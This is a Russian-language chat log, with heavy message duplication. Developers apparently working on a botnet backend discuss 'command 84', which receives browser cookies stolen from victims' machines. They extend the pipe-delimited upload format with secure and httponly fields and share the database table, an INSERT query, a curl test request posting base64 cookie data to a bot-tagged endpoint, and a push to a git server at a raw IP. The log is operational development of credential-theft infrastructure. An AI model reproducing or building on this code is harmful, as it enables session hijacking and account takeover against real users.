Timestamp	From	To	Message
username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n

где

username     - имя пользователя
browser      - код броузера (enum = chrome|ff|ie|edge)
domain       - домен куки
cookie_name  - имя куки
cookie_value - значение куки
created      - дата-время создания, Unix time
expires      - дата-время истечения, Unix time
path         - путь URI
2021-08-31 09:26:49.567479	ttrr	hof	К тому, что у меня не было этого дока. Где описание В64? Это часть формата.
2021-08-31 09:28:37.307307	ttrr	hof	нету про базе64 .. сами добавили очевидно
2021-08-31 09:28:51.262142	ttrr	hof	чтобы экранировать символы
2021-08-31 09:29:50.578167	ttrr	hof	Ну, вот это и нужно в доку добавить.
created у нас в секундах?
2021-08-31 09:30:27.365937	ttrr	hof	created_at я ставлю сам как NOW()
2021-08-31 09:30:36.635708	ttrr	hof	Не догадываться же, как там отстойник обрабатывает, верно?
2021-08-31 09:31:00.363613	ttrr	hof	а .есть другой ..
2021-08-31 09:31:02.581797	ttrr	hof	щас посмотрю
2021-08-31 09:31:21.651585	ttrr	hof	А NOW() в секундах?
2021-08-31 09:32:35.414837	ttrr	hof	забей на NOW() это другое
2021-08-31 09:36:27.498895	ttrr	hof	CREATE TABLE public.data84 (
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    "group" character varying(64),
    created_at timestamp without time zone,
    username text,
    browser text,
    domain text,
    cookie_name text,
    cookie_value text,
    created text,
    expires text,
    path text
);
2021-08-31 09:36:31.363979	ttrr	hof	вот таблица
2021-08-31 09:36:37.406424	ttrr	hof	created - просто текст
2021-08-31 09:36:41.642186	ttrr	hof	нету про базе64 .. сами добавили очевидно 
Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
2021-08-31 09:36:43.349041	ttrr	hof	всё - просто текст
2021-08-31 09:37:34.040053	ttrr	hof	> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  
очевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.
коду уже 5 лет
2021-08-31 09:39:30.948511	ttrr	hof	Ну, это тоже не очевидно)
По факту ошибки посыпались. Документация не полная.
2021-08-31 09:41:31.313726	ttrr	hof	где же ты был )
2021-08-31 10:40:22.321823	ttrr	hof	Zulas ты под новые поля базу тоже будешь менять?
Если да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены.
2021-08-31 10:40:58.855178	ttrr	hof	Я написал миграции под два поля secure и httponly
2021-08-31 10:41:19.042988	ttrr	hof	Оба логических.
2021-08-31 10:41:50.953509	ttrr	hof	не буду делать .
2021-08-31 10:41:53.236374	hof	ttrr	и в 90 команду добавились новые поля
2021-08-31 10:41:53.240939	ttrr	hof	и в 90 команду добавились новые поля
2021-08-31 10:42:06.309901	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 10:42:24.066732	hof	ttrr	поля не будут сохраняться, если их больше?
2021-08-31 10:42:24.071555	ttrr	hof	поля не будут сохраняться, если их больше?
2021-08-31 10:42:41.759921	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-08-31 10:42:55.644664	hof	ttrr	а, ок
2021-08-31 10:42:55.646911	ttrr	hof	а, ок
2021-08-31 10:42:55.699571	ttrr	hof	Пока не накатил, сек сделаю
2021-08-31 10:44:25.982350	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 10:44:38.110725	ttrr	hof	И в бэке его тоже вроде как нет
2021-08-31 10:44:40.987819	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 10:46:16.071480	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 11:01:29.531061	ttrr	hof	По 2м полям в куках накатил миграции.
2021-08-31 11:05:53.202848	ttrr	hof	нету про базе64 .. сами добавили очевидно 
Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
2021-08-31 11:05:53.203338	ttrr	hof	всё - просто текст
2021-08-31 11:05:53.204557	ttrr	hof	> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  
очевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.
коду уже 5 лет
2021-08-31 11:05:53.205297	ttrr	hof	Ну, это тоже не очевидно)
По факту ошибки посыпались. Документация не полная.
2021-08-31 11:05:53.206066	ttrr	hof	где же ты был )
2021-08-31 11:05:53.207318	ttrr	hof	Zulas ты под новые поля базу тоже будешь менять?
Если да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены.
2021-08-31 11:05:53.208464	ttrr	hof	Я написал миграции под два поля secure и httponly
2021-08-31 11:05:53.209202	ttrr	hof	Оба логических.
2021-08-31 11:05:53.209995	ttrr	hof	не буду делать .
2021-08-31 11:05:53.211005	ttrr	hof	и в 90 команду добавились новые поля
2021-08-31 11:05:53.212453	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 11:05:53.218230	ttrr	hof	поля не будут сохраняться, если их больше?
2021-08-31 11:05:53.219750	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-08-31 11:05:53.220657	ttrr	hof	а, ок
2021-08-31 11:05:53.221791	ttrr	hof	Пока не накатил, сек сделаю
2021-08-31 11:05:53.222753	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 11:05:53.224142	ttrr	hof	И в бэке его тоже вроде как нет
2021-08-31 11:05:53.225089	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 11:05:53.226731	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 11:05:53.227830	ttrr	hof	По 2м полям в куках накатил миграции.
2021-08-31 16:17:38.421299	ttrr	hof	Оба логических.
2021-08-31 16:17:38.421905	ttrr	hof	не буду делать .
2021-08-31 16:17:38.423063	ttrr	hof	и в 90 команду добавились новые поля
2021-08-31 16:17:38.423539	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 16:17:38.424179	ttrr	hof	поля не будут сохраняться, если их больше?
2021-08-31 16:17:38.425056	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-08-31 16:17:38.426067	ttrr	hof	а, ок
2021-08-31 16:17:38.426661	ttrr	hof	Пока не накатил, сек сделаю
2021-08-31 16:17:38.427372	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 16:17:38.428065	ttrr	hof	И в бэке его тоже вроде как нет
2021-08-31 16:17:38.428553	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 16:17:38.429427	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 16:17:38.430186	ttrr	hof	По 2м полям в куках накатил миграции.
2021-08-31 16:17:38.431249	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-08-31 16:17:38.431931	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 16:17:38.432690	ttrr	hof	потому повтори этот вопрос как он появится
2021-08-31 16:17:38.433331	ttrr	hof	Оке, тут получается нет истории..
2021-08-31 16:17:38.433903	ttrr	hof	неа
2021-08-31 16:17:38.434523	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-08-31 16:17:38.435161	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-08-31 18:41:02.850531	ttrr	hof	Оба логических.
2021-08-31 18:41:02.851067	ttrr	hof	не буду делать .
2021-08-31 18:41:02.851360	ttrr	hof	и в 90 команду добавились новые поля
2021-08-31 18:41:02.852382	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 18:41:02.852705	ttrr	hof	поля не будут сохраняться, если их больше?
2021-08-31 18:41:02.853376	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-08-31 18:41:02.853987	ttrr	hof	а, ок
2021-08-31 18:41:02.854563	ttrr	hof	Пока не накатил, сек сделаю
2021-08-31 18:41:02.855263	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 18:41:02.855571	ttrr	hof	И в бэке его тоже вроде как нет
2021-08-31 18:41:02.856442	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 18:41:02.856868	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 18:41:02.857605	ttrr	hof	По 2м полям в куках накатил миграции.
2021-08-31 18:41:02.858561	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-08-31 18:41:02.859042	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 18:41:02.859349	ttrr	hof	потому повтори этот вопрос как он появится
2021-08-31 18:41:02.859776	ttrr	hof	Оке, тут получается нет истории..
2021-08-31 18:41:02.860797	ttrr	hof	неа
2021-08-31 18:41:02.861134	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-08-31 18:41:02.861644	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-09-01 06:33:14.077178	ttrr	hof	не буду делать .
2021-09-01 06:33:14.078486	ttrr	hof	и в 90 команду добавились новые поля
2021-09-01 06:33:14.079865	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-09-01 06:33:14.080419	ttrr	hof	поля не будут сохраняться, если их больше?
2021-09-01 06:33:14.081693	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-09-01 06:33:14.082683	ttrr	hof	а, ок
2021-09-01 06:33:14.083297	ttrr	hof	Пока не накатил, сек сделаю
2021-09-01 06:33:14.084529	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-09-01 06:33:14.085675	ttrr	hof	И в бэке его тоже вроде как нет
2021-09-01 06:33:14.086361	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-09-01 06:33:14.087470	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-09-01 06:33:14.088428	ttrr	hof	По 2м полям в куках накатил миграции.
2021-09-01 06:33:14.089558	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-09-01 06:33:14.090588	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-09-01 06:33:14.091373	ttrr	hof	потому повтори этот вопрос как он появится
2021-09-01 06:33:14.092189	ttrr	hof	Оке, тут получается нет истории..
2021-09-01 06:33:14.093159	ttrr	hof	неа
2021-09-01 06:33:14.094004	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-09-01 06:33:14.095147	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-09-01 06:33:14.096325	ttrr	hof	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-01 06:33:17.310295	hof	ttrr	oad
2021-09-01 06:33:17.317152	ttrr	hof	oad
2021-09-01 13:51:45.509167	ttrr	hof	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-01 13:52:09.084008	ttrr	hof	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-01 13:52:09.084812	ttrr	hof	Как повторить к сожалению не знаю пока
2021-09-02 06:50:10.716756	ttrr	hof	поля не будут сохраняться, если их больше?
2021-09-02 06:50:10.717364	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-09-02 06:50:10.718858	ttrr	hof	а, ок
2021-09-02 06:50:10.719167	ttrr	hof	Пока не накатил, сек сделаю
2021-09-02 06:50:10.719696	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-09-02 06:50:10.720441	ttrr	hof	И в бэке его тоже вроде как нет
2021-09-02 06:50:10.721145	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-09-02 06:50:10.721803	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-09-02 06:50:10.722693	ttrr	hof	По 2м полям в куках накатил миграции.
2021-09-02 06:50:10.723442	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-09-02 06:50:10.724052	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-09-02 06:50:10.724559	ttrr	hof	потому повтори этот вопрос как он появится
2021-09-02 06:50:10.725312	ttrr	hof	Оке, тут получается нет истории..
2021-09-02 06:50:10.725878	ttrr	hof	неа
2021-09-02 06:50:10.726691	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-09-02 06:50:10.727332	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-09-02 06:50:10.728061	ttrr	hof	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-02 06:50:10.728842	ttrr	hof	oad
2021-09-02 06:50:10.729351	ttrr	hof	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-02 06:50:10.730180	ttrr	hof	Как повторить к сожалению не знаю пока
2021-09-02 09:15:17.515733	ttrr	hof	поля не будут сохраняться, если их больше?
2021-09-02 09:15:17.516163	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-09-02 09:15:17.516817	ttrr	hof	а, ок
2021-09-02 09:15:17.517263	ttrr	hof	Пока не накатил, сек сделаю
2021-09-02 09:15:17.518042	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-09-02 09:15:17.518365	ttrr	hof	И в бэке его тоже вроде как нет
2021-09-02 09:15:17.519110	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-09-02 09:15:17.519424	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-09-02 09:15:17.520024	ttrr	hof	По 2м полям в куках накатил миграции.
2021-09-02 09:15:17.520815	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-09-02 09:15:17.521209	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-09-02 09:15:17.521852	ttrr	hof	потому повтори этот вопрос как он появится
2021-09-02 09:15:17.522386	ttrr	hof	Оке, тут получается нет истории..
2021-09-02 09:15:17.523035	ttrr	hof	неа
2021-09-02 09:15:17.523643	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-09-02 09:15:17.524435	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-09-02 09:15:17.525230	ttrr	hof	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-02 09:15:17.525590	ttrr	hof	oad
2021-09-02 09:15:17.526294	ttrr	hof	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-02 09:15:17.526648	ttrr	hof	Как повторить к сожалению не знаю пока
2021-09-02 11:28:45.765014	ttrr	hof	всем привет
2021-09-02 11:28:50.926442	ttrr	hof	как дела с деро?
2021-09-02 11:29:03.159572	ttrr	hof	zulas: понятна проблема?
2021-09-02 11:30:43.885146	ttrr	hof	деф . привет .. а в чем проблема ?
2021-09-02 11:33:13.545290	ttrr	hof	driver: отпиши что ты мне написал сюда
2021-09-02 11:33:20.364659	ttrr	hof	ответ 403 был
2021-09-02 11:33:26.029367	ttrr	hof	с ним разобрались?
2021-09-02 11:36:33.218495	ttrr	hof	Бэк отвечает 403 на попытку отправить куки.
2021-09-02 11:36:55.084286	ttrr	hof	Внесли ли изменения связанные с новыми полями?
2021-09-02 11:38:21.044625	ttrr	hof	давайте конкретно: кто и что должен внести?
2021-09-02 11:38:32.054325	ttrr	hof	тк походу зулас даже не в курсе
2021-09-02 11:39:06.182362	ttrr	hof	4ый день мы тут что то обсуждаем, а в итоге ничего не делаем
2021-09-02 11:39:10.284873	ttrr	hof	в чем проблема?
2021-09-02 11:39:34.331834	ttrr	hof	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 11:39:51.361303	ttrr	hof	В базу должны записываться поля с такими же именами
2021-09-02 11:41:12.882030	ttrr	hof	я ничего не вносил пока ..
2021-09-02 11:41:48.451442	ttrr	hof	так уже пора внести
2021-09-02 11:41:53.197259	ttrr	hof	драйвер же просил
2021-09-02 11:42:05.655913	ttrr	hof	у нас доработка прямо сейчас в модуле сбора, требует этого
2021-09-02 11:42:10.208571	ttrr	hof	Ок. Когда?
2021-09-02 11:43:37.294638	ttrr	hof	Я не стал этого делать потому что мне сказали, что сейчас zulas занимается бэком, но я напрямую не писал задачу.
Возможно решил что вы с кодером модуля обсудили этот момент
2021-09-02 11:44:33.238680	ttrr	hof	(31.08.2021 13:44:35) zulas: добавляй сразу всё чтобы мне не возвращаться
(31.08.2021 13:46:11) driver: Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
(31.08.2021 14:01:24) driver: По 2м полям в куках накатил миграции.
2021-09-02 11:44:45.185064	ttrr	hof	ну вообще надо все сразу сделать и чтобы не возвращаться
2021-09-02 11:44:52.285746	ttrr	hof	переключение контекста -- очень тяжелая операция )
2021-09-02 11:45:14.307468	ttrr	hof	так что 
1. я жду когда в базу нужное внесется
2. когда мне будет объяснено что нужно делать
2021-09-02 11:59:16.917141	ttrr	hof	так а по-моему driver говорил что накатил миграции на базу. Это не оно?
цитату не приведу, уплыло в истории
2021-09-02 12:03:26.095535	ttrr	hof	driver: поясни мне чего ты ждешь?
2021-09-02 12:03:33.365511	ttrr	hof	что нужно от зуласа?
2021-09-02 12:11:37.702419	ttrr	hof	Дело в том что миграция по десктопу относится к другой задаче.
2021-09-02 12:11:51.016545	ttrr	hof	Сейчас нужно сделать 2 этих поля
2021-09-02 12:12:18.872112	ttrr	hof	zulas: сделаешь?
2021-09-02 12:14:06.097561	ttrr	hof	Более того к другой команде и к другой таблице.
2021-09-02 12:15:43.897550	ttrr	hof	@driver давай конкретно что тебе надо и куда ... ок ?
2021-09-02 12:17:36.626210	ttrr	hof	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 12:18:22.060042	ttrr	hof	На запрос вида 
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
Должно ответить /1/
2021-09-02 12:20:09.147689	ttrr	hof	ок .. сейчас в базе поля уже есть ?
2021-09-02 12:20:19.947743	ttrr	hof	Да
2021-09-02 12:28:19.572533	ttrr	hof	а старые клиенты еще работают ?
2021-09-02 12:28:40.296562	ttrr	hof	т.е. надо поддерживать и старый формат и новый ?
2021-09-02 12:29:44.534785	ttrr	hof	Нет, просто только новый должен начать работать.
2021-09-02 12:30:37.243111	ttrr	hof	Уже внесли нужные изменения для клиентов. Ждем именно чтобы подхватило эти изменения часть по бэку
2021-09-02 12:59:04.946587	ttrr	hof	zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться
2021-09-02 13:03:56.542085	ttrr	hof	хорошо сделаю
2021-09-02 13:23:09.881679	ttrr	hof	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
2021-09-02 13:23:13.464082	ttrr	hof	такая последовательность ?
2021-09-02 13:23:20.884376	ttrr	hof	@driver
2021-09-02 13:26:57.392049	ttrr	hof	@defender как мне запушить изменения ?
2021-09-02 13:37:09.263205	ttrr	hof	Да все верно.
2021-09-02 14:18:44.638101	ttrr	hof	zulas: а я тебе вроде выдавал доступ, разве нет?
2021-09-02 16:43:17.462278	ttrr	hof	я его 100 раз забыл
2021-09-02 16:43:37.840304	ttrr	hof	~/erl/dero> git -c credential.helper=/usr/share/smartgit/lib/credentials.sh push --porcelain --progress --recurse-submodules=check origin refs/heads/master:refs/heads/master
unable to access 'https://179.43.147.243/begemot/dero.git/': gnutls_handshake() failed: Internal error
2021-09-02 16:44:19.026213	ttrr	hof	ок, щас в личку кину
2021-09-03 07:23:12.980938	ttrr	hof	@driver давай конкретно что тебе надо и куда ... ок ?
2021-09-03 07:23:12.981885	ttrr	hof	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-03 07:23:12.982726	ttrr	hof	На запрос вида 
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
Должно ответить /1/
2021-09-03 07:23:12.983789	ttrr	hof	ок .. сейчас в базе поля уже есть ?
2021-09-03 07:23:12.984230	ttrr	hof	Да
2021-09-03 07:23:12.985196	ttrr	hof	а старые клиенты еще работают ?
2021-09-03 07:23:12.985809	ttrr	hof	т.е. надо поддерживать и старый формат и новый ?
2021-09-03 07:23:12.986793	ttrr	hof	Нет, просто только новый должен начать работать.
2021-09-03 07:23:12.987449	ttrr	hof	Уже внесли нужные изменения для клиентов. Ждем именно чтобы подхватило эти изменения часть по бэку
2021-09-03 07:23:12.988502	ttrr	hof	zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться
2021-09-03 07:23:12.988947	ttrr	hof	хорошо сделаю
2021-09-03 07:23:12.989927	ttrr	hof	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
2021-09-03 07:23:12.990465	ttrr	hof	такая последовательность ?
2021-09-03 07:23:12.991282	ttrr	hof	@driver
2021-09-03 07:23:12.991842	ttrr	hof	@defender как мне запушить изменения ?
2021-09-03 07:23:12.992439	ttrr	hof	Да все верно.
2021-09-03 07:23:12.993031	ttrr	hof	zulas: а я тебе вроде выдавал доступ, разве нет?
2021-09-03 07:23:12.994069	ttrr	hof	я его 100 раз забыл
2021-09-03 07:23:12.994773	ttrr	hof	~/erl/dero> git -c credential.helper=/usr/share/smartgit/lib/credentials.sh push --porcelain --progress --recurse-submodules=check origin refs/heads/master:refs/heads/master
unable to access 'https://179.43.147.243/begemot/dero.git/': gnutls_handshake() failed: Internal error
2021-09-03 07:23:12.995650	ttrr	hof	ок, щас в личку кину
2021-09-03 09:27:34.710180	ttrr	hof	Добрый день! Как успехи по пушу кода?
2021-09-03 09:28:03.407013	ttrr	hof	@zulas @defender
2021-09-03 09:28:22.267375	ttrr	hof	надо запушить . жду дефа
2021-09-03 09:31:17.971027	ttrr	hof	Ок
2021-09-03 11:49:56.200310	ttrr	hof	А есть вариант просто на сервер залить этот код пока что?
2021-09-03 11:50:22.705601	ttrr	hof	Чтобы мы потестили, а с гитом позже разобраться7
2021-09-03 11:57:50.005207	ttrr	hof	зулас запушил
2021-09-03 11:57:56.219383	ttrr	hof	я его попросил выгрузить на сервер
2021-09-03 11:58:32.838558	ttrr	hof	 driver или ты выгрузи сам
2021-09-03 12:17:17.911828	ttrr	hof	Ок
2021-09-03 12:17:26.285571	ttrr	hof	Выгружу.
2021-09-03 12:54:25.744793	ttrr	hof	SQL = "INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( NOW(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13 )",
2021-09-03 12:55:03.224171	ttrr	hof	@zulas не вставил 2 поля в запрос в базу.
2021-09-03 12:55:17.837652	ttrr	hof	Поправь пожалуйста.
2021-09-03 13:02:44.311709	ttrr	hof	И таблицу архива куков, там тоже эти 2 поля нужны будут.
2021-09-03 13:03:34.031083	ttrr	hof	По остальному посмотрел, вижу схему нормальную сделал, все ок. Это у нас недавно было актуальной проблемой.
2021-09-03 13:04:19.050514	ttrr	hof	cookies_archive*
2021-09-03 13:23:45.184958	ttrr	hof	zulas отпиши по времени, когда сможешь сделать фиксы
2021-09-03 13:44:34.796607	ttrr	hof	щас посмотрю
2021-09-03 13:46:05.462879	ttrr	hof	@driver cookies_archive* .. я такой таблицей не пользуюсь
2021-09-03 13:56:14.445082	ttrr	hof	пофиксил запрос
2021-09-03 13:56:17.184880	ttrr	hof	не тестировал
2021-09-06 07:10:08.071474	ttrr	hof	сегодня отдых у всех ?
2021-09-06 10:24:06.853170	ttrr	hof	сегодня отдых у всех ?
2021-09-06 14:25:14.173391	ttrr	hof	сегодня отдых у всех ?
2021-09-07 07:12:19.348324	ttrr	hof	сегодня отдых у всех ?
2021-09-07 17:51:07.156128	ttrr	hof	сегодня отдых у всех ?
2021-09-08 06:28:58.561881	ttrr	hof	сегодня отдых у всех ?
2021-09-09 07:31:36.704969	ttrr	hof	сегодня отдых у всех ?
2021-09-10 07:06:36.942857	ttrr	hof	сегодня отдых у всех ?
2021-09-13 06:35:46.794717	ttrr	hof	сегодня отдых у всех ?
2021-09-14 08:12:09.363241	ttrr	hof	сегодня отдых у всех ?
2021-09-14 08:12:09.364003	ttrr	hof	есть кто
2021-09-15 07:09:26.714623	ttrr	hof	сегодня отдых у всех ?
2021-09-15 07:09:26.715161	ttrr	hof	есть кто
2021-09-16 06:48:07.676226	ttrr	hof	сегодня отдых у всех ?
2021-09-16 06:48:07.676799	ttrr	hof	есть кто
